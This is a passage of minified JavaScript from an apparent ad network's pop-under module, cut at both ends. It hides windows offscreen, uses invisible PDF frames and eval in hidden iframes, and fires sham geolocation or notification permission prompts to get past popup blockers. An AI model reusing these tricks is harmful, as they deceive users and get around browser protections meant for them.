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", _blankPdf:"data:application/pdf;base64,JVBERi0xLjANCjEgMCBvYmo8PC9QYWdlcyAyIDAgUj4+ZW5kb2JqIDIgMCBvYmo8PC9LaWRzWzMgMCBSXS9Db3VudCAxPj5lbmRvYmogMyAwIG9iajw8L01lZGlhQm94WzAgMCAzIDNdPj5lbmRvYmoNCnRyYWlsZXI8PC9Sb290IDEgMCBSPj4=",_randomString:Math.floor(1E3*Math.random()+1).toString(),_postWindowPopCalled:!1,_popWin:null,_handle:null,_minX:1,_minY:1,_maxLeft:19999,_maxTop:19999,_desiredMode:1,_popOpenModes:{pdf:0,notification:1,pdfAndFalseTab:2,tabUnder:3,doublePop:4,doublePdf:5,doublePdfDoublePop:6, hidden:7,popOver:8,postMessage:9},_requirePdf:function(){var a=e.UaParser.getBrowser();return"Mac OS"===e.UaParser.getOS().name?57>=a.major:57>=a.major||60<=a.major&&64>a.major?!0:!1},_getPopOpenMode:function(){var a=e.UaParser.getBrowser(),b=e.UaParser.getOS();if(64<=a.major&&this._desiredMode==this._popOpenModes.pdfAndFalseTab)return this._popOpenModes.postMessage;if("Mac OS"===b.name&&this._desiredMode!=this._popOpenModes.hidden)return 57<a.major?this._popOpenModes.notification:this._popOpenModes.pdf; if(!navigator.mimeTypes["application/pdf"]){if(57<a.major&&60>a.major)return this._popOpenModes.notification;throw"Pop not supported for this browser";}if(this._desiredMode==this._popOpenModes.tabUnder)return 48<a.major?this._popOpenModes.tabUnder:this._popOpenModes.pdf;if(this._desiredMode==this._popOpenModes.doublePop)return 48<a.major&&61>a.major?this._popOpenModes.doublePop:61<=a.major?this._popOpenModes.doublePdfDoublePop:this._popOpenModes.pdf;if(this._desiredMode==this._popOpenModes.notification)return 57< a.major?this._popOpenModes.notification:this._popOpenModes.pdf;if(this._desiredMode==this._popOpenModes.pdfAndFalseTab)return 57<a.major&&60>a.major?"https:"!==window.location.protocol||"Windows"===b.name&&"7"===b.version?this._popOpenModes.pdfAndFalseTab:this._popOpenModes.notification:60==a.major?this._popOpenModes.pdfAndFalseTab:60<a.major?this._popOpenModes.doublePdf:this._popOpenModes.pdf;if(this._desiredMode==this._popOpenModes.hidden)return this._desiredMode;throw"Unsupported display mode"; },_magicNumbers:function(){var a=e.UaParser.getBrowser(),b=e.UaParser.getOS();return"Mac OS"===b.name?"Chrome"===a.name?{x:100,y:71}:"Opera"===a.name?{x:100,y:86}:{x:0,y:0}:"Windows"===b.name?"Chrome"===a.name?"56"===a.major?{x:122,y:34}:{x:120,y:33}:"Opera"===a.name?{x:270,y:129}:{x:0,y:0}:{x:0,y:0}},_triggerClick:function(a){this._guid.BasePopunder.triggerClick(a,this._getTriggerEvent())},_createObject:function(a){a=document.createElement("div");a.setAttribute("style","visibility:hidden;width:0px;height:0px;opacity:0;position:absolute;top:100%;left:0;pointer-events:none;overflow:hidden;"); a.setAttribute("inf","inf");var b=document.createElement("object");b.setAttribute("data",this._showPdf);a.appendChild(b);this._guid._Top.document.body&&this._guid._Top.document.body.appendChild(a);return b},_getPopRect:function(a){var b=this._guid,c=a?0:this._magicNumbers().x;a=a?0:this._magicNumbers().y;return{x:b.GetWindowLeft()+b.GetWindowWidth()/2-512,y:b.GetWindowTop()+b.GetWindowHeight()/2-384,width:this._popWidth-c,height:this._popHeight-a}},_postWindowPop:function(a){var b=this._guid,c=this._getPopRect(); try{this._popWin.moveTo(c.x,c.y),this._popWin.resizeBy(c.width,c.height),this._popWin.location=b.BasePopunder.buildUrl(this._popMediaUrl,b.Enums.SelectedPopType.PopUnder)}catch(g){b.ConsoleLog(g)}this._triggerClick(a);b.BasePopunder.postWindowPop()},_focusAchieved:function(a){if(!this._postWindowPopCalled){this._postWindowPopCalled=!0;if(this._getPopOpenMode()===this._popOpenModes.pdf){this._handle.setAttribute("data",this._blankPdf);var b=this;setTimeout(function(){b._handle.parentNode.parentNode.removeChild(b._handle.parentNode)}, 20)}this._postWindowPop(a)}},_focusMainWindow:function(a){if(this._getPopOpenMode()==this._popOpenModes.notification){var b=document.createElement("iframe");b.width=0;b.height=0;b.style.width="0";b.style.height="0";b.srcdoc="https:"===location.protocol?"<script>navigator.geolocation.getCurrentPosition(function(){});\x3c/script>":"<script>Notification.requestPermission(function(){});\x3c/script>";document.body.appendChild(b);setTimeout(function(){b.parentNode.removeChild(b);a()},150)}else this._handle= this._createObject(this._showPdf),e._Top.addEventListener("focus",a),setTimeout(a,3E3)},_createHiddenPdfFrame:function(){var a=this._guid._Top.document.createElement("iframe");a.name=(new Date).getTime().toString();a.id=a.name;a.type="application/pdf";a.src=this._showPdf;a.setAttribute("style","width:100px;height:100px;position:absolute;top:-1000px;left:1000px;");a.reset=function(){a.src="about:blank"};a.remove=function(){};return a},_createTabUnderContent:function(a){var b="("+function(){window.go= function(){window.location.replace(window.popUrl)}}.toString()+")();",c=new this.HtmlSourceBuilder,g=[];g.push("var popUrl = '"+a+"';");g.push(b);c.addScript(g.join("\n"));return c.toString()},_createDoublePopTabContent:function(a,b){var c=e;a=c.BasePopunder.buildUrl(a,null!=b?c.Enums.SelectedPopType.PopUnder:c.Enums.SelectedPopType.TabUnder);b=c.BasePopunder.buildUrl(b,c.Enums.SelectedPopType.TabUnder);c="("+function(){var l=null;setTimeout(function(){window.close()},1E4);window.addEventListener("mouseup", function(){l||(l=window.open("about:blank","win_"+(new Date).getTime().toString(),popOptions))});window.addEventListener("message",function(d){if(d.data&&0===d.data.indexOf("inf_pop_url::")){var f=d.data.substring(13);"null"===f||0===f.length?window.close():window.setTimeout(function(){window.location.replace(f)},1)}},!1);window.go=function(){l?(l.moveTo(popRect.x,popRect.y),l.resizeTo(popRect.width+(l.outerWidth-l.innerWidth),popRect.height+(l.outerHeight-l.innerHeight)),l.location.replace(window.popUrl), window.popUrl2&&window.setTimeout(function(){window.location.replace(window.popUrl2)},1)):window.location.replace(window.popUrl)}}.toString()+")();";var g=new this.HtmlSourceBuilder,h=[];h.push("var popRect = "+JSON.stringify(this._getPopRect(!0))+";");h.push("var popUrl = '"+a+"';");b&&h.push("var popUrl2 = '"+b+"';");h.push("var popOptions = '"+this._guid.PopMediaOptions+"';");h.push(c);g.addScript(h.join("\n"));return g.toString()},HtmlSourceBuilder:function(){var a=[];this.addScript=function(b){a.push(b)}; this.toString=function(){var b=[];b.push("<!DOCTYPE HTML>");b.push("<html>");b.push('<head><title></title><meta name="Referrer" content="unsafe-url"/></head>');b.push("<body>");for(var c=0;c<a.length;c++)b.push("<"+"script".toString()+">"),b.push(a[c]),b.push("</"+"script".toString()+">");b.push("</body>");b.push("</html>");return b.join("\n")}},_createDoublePdfDoublePopTabContent:function(a,b){var c=e;a=c.BasePopunder.buildUrl(a,null!=b?c.Enums.SelectedPopType.PopUnder:c.Enums.SelectedPopType.TabUnder); b=c.BasePopunder.buildUrl(b,c.Enums.SelectedPopType.TabUnder);c="("+function(){function l(){var f="("+function(){window.addEventListener("message",function(n){n.data&&0===n.data.indexOf("inf_pop_resize")?(n=n.data.substring(16).split("x"),window.resizeBy(n[0],n[1])):tab&&n.data&&0===n.data.indexOf("inf_pop_url::")&&(n=n.data.substring(13),"null"===n||0===n.length?tab.close():tab.location.replace(n))},!1);var m=document.createElement("iframe");m.src=window.popUrl;m.setAttribute("style","width:100%;height:100%"); document.body.appendChild(m)}.toString()+")();",k=[];k.push("<!DOCTYPE HTML>");k.push("<html>");k.push('<head><title></title><meta name="Referrer" content="unsafe-url"/></head>');k.push("<body>");k.push("<"+"script".toString()+">");k.push("var popUrl = '"+window.popUrl+"';");k.push(f);k.push("</"+"script".toString()+">");k.push("</body>");k.push("</html>");return k.join("\n")}setTimeout(function(){window.close()},1E4);window.go=function(){var f=window.pop;if(f)if(f.moveTo(popRect.x,popRect.y),f.resizeTo(popRect.width+ (f.outerWidth-f.innerWidth),popRect.height+(f.outerHeight-f.innerHeight)),window.popUrl2)f.location.replace(window.popUrl),window.setTimeout(function(){window.location.replace(window.popUrl2)},1);else{var k=f.document;k.write(l(window.popUrl));k.close();f.tab=window}else window.location.replace(window.popUrl)};var d=document.createElement("iframe");d.type="application/pdf";d.src=window.pdf;d.setAttribute("style","width:100px;height:100px;position:absolute;top:-1000px;left:1000px;");document.body.appendChild(d); window.clean=function(){document.body.removeChild(d)}}.toString()+")();";var g=new this.HtmlSourceBuilder,h=[];h.push("var popRect = "+JSON.stringify(this._getPopRect(!0))+";");h.push("var popUrl = '"+a+"';");b&&h.push("var popUrl2 = '"+b+"';");h.push("var pdf = '"+this._showPdf+"';");h.push(c);g.addScript(h.join("\n"));return g.toString()},_createDoublePdfPopContent:function(a){var b=e;a=b.BasePopunder.buildUrl(a,b.Enums.SelectedPopType.PopUnder);b="("+function(){var h=setTimeout(function(){window.go()}, 5E3),l=setInterval(function(){window.openerExists()||window.go()},500);window.openerExists=function(){try{if(window.opener&&window.opener.location&&window.opener.location.href)return!0}catch(d){}return!1};window.go=function(){clearTimeout(h);clearInterval(l);window.moveTo(popRect.x,popRect.y);window.resizeTo(popRect.width+(window.outerWidth-window.innerWidth),popRect.height+(window.outerHeight-window.innerHeight));window.location.replace(window.popUrl)}}.toString()+")();";var c=new this.HtmlSourceBuilder, g=[];g.push("var popRect = "+JSON.stringify(this._getPopRect(!0))+";");g.push("var popUrl = '"+a+"';");g.push(b);c.addScript(g.join("\n"));return c.toString()},_createDoublePdfTabContent:function(a){var b=e;a=b.BasePopunder.buildUrl(a,b.Enums.SelectedPopType.TabUnder);b="("+function(){setTimeout(function(){window.close()},5E3);window.go=function(){window.pop?setTimeout(function(){window.close()},0):window.location.replace(window.popUrl)};var h=document.createElement("iframe");h.type="application/pdf"; h.src=window.pdf;h.setAttribute("style","width:100px;height:100px;position:absolute;top:-1000px;left:1000px;");document.body.appendChild(h);window.clean=function(){document.body.removeChild(h)}}.toString()+")();";var c=new this.HtmlSourceBuilder,g=[];g.push("var popRect = "+JSON.stringify(this._getPopRect(!0))+";");g.push("var popUrl = '"+a+"';");g.push("var pdf = '"+this._showPdf+"';");g.push(b);c.addScript(g.join("\n"));return c.toString()},_createFalseTabContent:function(a){var b="("+function(){var h= null;window.addEventListener("mouseup",function(){h||(h=window.open("about:blank","win_"+(new Date).getTime().toString(),popOptions))});setTimeout(function(){h&&h.close();window.close()},5E3);window.go=function(){h?(h.moveTo(popRect.x,popRect.y),h.resizeTo(popRect.width+(h.outerWidth-h.innerWidth),popRect.height+(h.outerHeight-h.innerHeight)),h.location.replace(window.popUrl),window.close()):window.location.replace(window.popUrl)}}.toString()+")();",c=new this.HtmlSourceBuilder,g=[];g.push("var popRect = "+ JSON.stringify(this._getPopRect(!0))+";");g.push("var popUrl = '"+a+"';");g.push("var popOptions = '"+this._guid.PopMediaOptions+"';");g.push(b);c.addScript(g.join("\n"));return c.toString()},_openTabUnder:function(a,b){function c(){if(!k){k=!0;l._guid._Top.removeEventListener("focus",c);d();f&&l._guid._Top.clearTimeout(f);g.reset();l._guid._Top.document.body.removeChild(g);try{h&&h.go()}catch(n){}l._triggerClick(b);l._guid.PopLoaded=!0;l._guid.PopRunning=!1;l._guid.IsFastPop?(l._guid.IncrementFastPopCap(), l._guid.OnFastPopLoaded()):"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback()}}a=this._guid.BasePopunder.buildUrl(a,this._guid.Enums.SelectedPopType.TabUnder);var g=this._createHiddenPdfFrame();this._guid._Top.document.body.appendChild(g);var h=null,l=this,d=this._onFocusOutAndIn(this._guid._Top,c),f=null,k=!1;this._guid._Top.addEventListener("focus",c);f=this._guid._Top.setTimeout(c,3E3);h=this._guid._Top.open("about:blank","_blank");var m=h.document;m.write(this._createTabUnderContent(a)); m.close()},_openViaDoublePdf:function(a,b,c){function g(){if(!f._guid.PopLoaded){k&&f._guid._Top.document.body.removeChild(k);try{l&&l.go&&l.go(),d&&d.go&&d.go()}catch(t){console.log(t)}f._triggerClick(a);f._guid.PopLoaded=!0;f._guid.PopRunning=!1;f._guid.IsFastPop?(f._guid.IncrementFastPopCap(),f._guid.OnFastPopLoaded()):"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback()}}function h(t){function u(){v||(v=!0,f._guid._Top.removeEventListener("focus",u),x(),z&&f._guid._Top.clearTimeout(z), k.reset(),t())}k=f._createHiddenPdfFrame();f._guid._Top.document.body.appendChild(k);var x=f._onFocusOutAndIn(f._guid._Top,u),z=null,v=!1;f._guid._Top.addEventListener("focus",u);z=f._guid._Top.setTimeout(u,3E3)}var l=this._guid._Top.open("about:blank","_blank"),d=null,f=this,k=null,m=l.document;m.write(b);m.close();var n=!1,r=setTimeout(function(){n=!0;l.clean();h(g)},500);l.addEventListener("mouseup",function(){if(!l.pop&&!n){clearTimeout(r);var t=setTimeout(function(){if(!l.closed){if(l.pop){try{l.pop.close()}catch(z){}l.pop= null}l.clean();h(g)}},3E3);l.addEventListener("focus",function(){clearTimeout(t);l.clean();h(g)});d=window.open("about:blank","win_"+(new Date).getTime().toString(),f._guid.PopMediaOptions);l.pop=d;if(c){var u=d.document;u.write(c);u.close();var x=setInterval(function(){l.closed&&(clearInterval(x),g())},100)}}})},_openViaPdfAndFalseTab:function(a,b){function c(){d._guid._Top.document.body.removeChild(h);try{l&&l.go()}catch(r){}d._triggerClick(a);d._guid.PopLoaded=!0;d._guid.PopRunning=!1;d._guid.IsFastPop? (d._guid.IncrementFastPopCap(),d._guid.OnFastPopLoaded()):"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback()}function g(){m||(m=!0,d._guid._Top.removeEventListener("focus",g),f(),k&&d._guid._Top.clearTimeout(k),h.reset(),setTimeout(c,200))}var h=this._createHiddenPdfFrame();this._guid._Top.document.body.appendChild(h);var l=null,d=this,f=this._onFocusOutAndIn(this._guid._Top,g),k=null,m=!1;this._guid._Top.addEventListener("focus",g);k=this._guid._Top.setTimeout(g,3E3); l=this._guid._Top.open("about:blank","_blank");var n=l.document;n.write(b);n.close()},_onPopDisplay:function(a){this._triggerClick(a);this._guid.PopRunning=!1;this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1);this._guid.IsFastPop?(this._guid.IncrementFastPopCap(),this._guid.OnFastPopLoaded()):(this._guid.PopLoaded=!0,"function"===typeof InfCustomerPopLoadedCallback&&InfCustomerPopLoadedCallback())},_onFocusOutAndIn:function(a,b){var c=null;c=setInterval(function(){a.document.hasFocus()|| (clearInterval(c),c=setInterval(function(){a.document.hasFocus()&&(clearInterval(c),c=null,b())},20))},20);return function(){null!=c&&clearInterval(c)}},_execute:function(a){var b=this,c=this._guid,g=a.target||a.srcElement;if(e.IsFeatureEnabled("IsLookForContainerAnchorLink"))try{if(g.tagName&&"a"!==g.tagName.toLowerCase()){var h=g.getBoundingClientRect(),l=c._Top.document.elementsFromPoint(h.left,h.top);for(h=0;h<l.length;h++)if(l[h].tagName&&"a"===l[h].tagName.toLowerCase()){g=l[h];break}}}catch(m){}c.EventObject= a;if(c.BasePopunder.execute(a,this._getTriggerEvent(),!1,g))if(l=this._getPopOpenMode(),l===this._popOpenModes.popOver){var d=this._getPopRect(!0);c=new c.PopOver;c.setUrl(this._popMediaUrl);c.setLocation(d.x,d.y);c.setSize(d.width,d.height);c.setOnSuccessCallback(function(){b._onPopDisplay(g)});c.show(a)}else if(l===this._popOpenModes.postMessage)d=this._getPopRect(!0),c=new c.PopUnderViaPostMessage,c.setUrl(this._popMediaUrl),c.setLocation(d.x,d.y),c.setSize(d.width,d.height),c.setOnSuccessCallback(function(){b._onPopDisplay(g)}), c.show(a);else if(l!==this._popOpenModes.doublePdf&&(l!==this._popOpenModes.doublePdfDoublePop||this._popMediaUrl2||c.IsFastPop||c.AbortFastPop))if(l===this._popOpenModes.doublePdfDoublePop)this._openViaDoublePdf(g,this._createDoublePdfDoublePopTabContent(this._popMediaUrl,this._popMediaUrl2)),this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1);else if(l!==this._popOpenModes.pdfAndFalseTab&&(l!==this._popOpenModes.doublePop||this._popMediaUrl2||c.IsFastPop||c.AbortFastPop))if(l=== this._popOpenModes.doublePop)a=this._createDoublePopTabContent(this._popMediaUrl,this._popMediaUrl2),this._openViaPdfAndFalseTab(g,a),this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1);else if(l==this._popOpenModes.tabUnder)this._openTabUnder(this._popMediaUrl,g),this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1);else if(l==this._popOpenModes.hidden)c=new c.DelayedPopUnder({waitSecondsToLoadMedia:c.IsFastPop?c.PopSettings.HiddenPopunderWaitSecondsToLoadMedia:c.PopMedia.Settings.HiddenPopunderWaitSecondsToLoadMedia, waitForParentToClose:c.IsFastPop?c.PopSettings.HiddenPopunderWaitForParentWindowToClose:c.PopMedia.Settings.HiddenPopunderWaitForParentWindowToClose,waitForParentToFocus:c.IsFastPop?c.PopSettings.HiddenPopunderWaitForParentWindowToFocus:c.PopMedia.Settings.HiddenPopunderWaitForParentWindowToFocus}),c.setUrl(this._popMediaUrl),d=this._getPopRect(!0),c.setLocation(d.x,d.y),c.setSize(d.width,d.height),c.setOnSuccessCallback(function(){b._onPopDisplay(g)}),c.show(a);else{var f=null;"Mac OS"!==c.UaParser.getOS().name&& (f=this._onFocusOutAndIn(c._Top,function(){b._focusAchieved(g)}));try{d=c._Top.document.createElement("iframe");d.setAttribute("style","display:none");c._Top.document.body.appendChild(d);var k=d.contentWindow.document.createElement("script");k.innerHTML="("+function(){var m=eval("window");m.init=function(n,r){return m.open("about:blank",n,r)}}.toString()+")();";d.contentWindow.document.body.appendChild(k);this._popWin=d.contentWindow.init(this._randomString,c.PopMediaOptions);c._Top.document.body.removeChild(d); this._popWin.document.write("<html><head><script>window.a={};window.a.b=function(){window.resizeTo(1,0);window.moveTo(19999,19999);};window.a.b();\x3c/script></head><body></body></html>")}catch(m){c.ConsoleLog(m)}this._focusMainWindow(function(){f&&f();b._focusAchieved(g)})}else a=this._createFalseTabContent(this._popMediaUrl),this._openViaPdfAndFalseTab(g,a),this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1);else this._openViaDoublePdf(g,this._createDoublePdfTabContent(this._popMediaUrl), this._createDoublePdfPopContent(this._popMediaUrl)),this._guid.Storage.SetSessionStorage("InfChromePopEventAttached",!1)},supported:function(){return!e.IsMobile.any(e._Top)&&!(this._requirePdf()&&!navigator.mimeTypes["application/pdf"])},init:function(a,b){try{if(this.supported()){var c=this._guid=e;this._desiredMode=b==c.Enums.chromePopApproach.notification?this._popOpenModes.notification:b==c.Enums.chromePopApproach.notificationEx?this._popOpenModes.pdfAndFalseTab:b==c.Enums.chromePopApproach.doublePop? this._popOpenModes.doublePop:b==c.Enums.chromePopApproach.hidden?this._popOpenModes.hidden:this._popOpenModes.tabUnder;var g=this,h=this._getPopOpenMode()===this._popOpenModes.tabUnder;if(c.IsFastPop&&!c.AbortFastPop)this._popMediaUrl=c.BasePopunder.getFastPopUrl(),h&&(this._popMediaUrl+="&hosted=true"),c.PopMediaOptions="directories=0,toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width="+this._minX+",height="+this._minY+",screenX="+this._maxLeft+",screenY="+this._maxTop,this._popWidth= 1024,this._popHeight=768;else{var l=!1;this._getPopOpenMode()===this._popOpenModes.doublePop||this._getPopOpenMode()===this._popOpenModes.doublePdfDoublePop?a.AdItems?(this._popMediaUrl=c.CreateAdUrl(a,!1,a.AdItems[0]),this._popMediaUrl2=1<a.AdItems.length?c.CreateAdUrl(a,!1,a.AdItems[1]):null,this._popWidth=a.AdItems[0].MediaSettings.Width,this._popHeight=a.AdItems[0].MediaSettings.Height):(this._popMediaUrl=c.FetchMediaUrl(a),this._popWidth=(l=a.ZoneAcceptsFullscreenPageunder&&a.MediaAllowsFullscreenPageunder)? this._guid._Top.window.screen.availWidth:a.Settings.Width,this._popHeight=l?this._guid._Top.window.screen.availHeight:a.Settings.Height):a.AdItems?(this._popMediaUrl=c.CreateAdUrl(a,h),this._popWidth=a.AdItems[0].MediaSettings.Width,this._popHeight=a.AdItems[0].MediaSettings.Height):(this._popMediaUrl=c.FetchMediaUrl(a,h),this._popWidth=(l=a.ZoneAcceptsFullscreenPageunder&&a.MediaAllowsFullscreenPageunder)?this._guid._Top.window.screen.availWidth:a.Settings.Width,this._popHeight=l?this._guid._Top.window.screen.availHeight: a.Settings.Height);c.PopMediaOptions="directories=0,toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width="+this._minX+",height="+this._minY+",screenX="+(l?0:this._maxLeft)+",screenY="+(l?0:this._maxTop);c.PopMedia=a}void 0===c._Top.g367CB268B1094004A3689751E7AC568F&&(c._Top.g367CB268B1094004A3689751E7AC568F={});c.ChromePopMouseDownHandler=function(d){c.BasePopunder.mouseDownHandler(d,a)&&g._execute(d)};"true"!==c.Storage.GetSessionStorage("InfChromePopEventAttached")&&(c._Top.document.addEventListener(this._getTriggerEvent(), 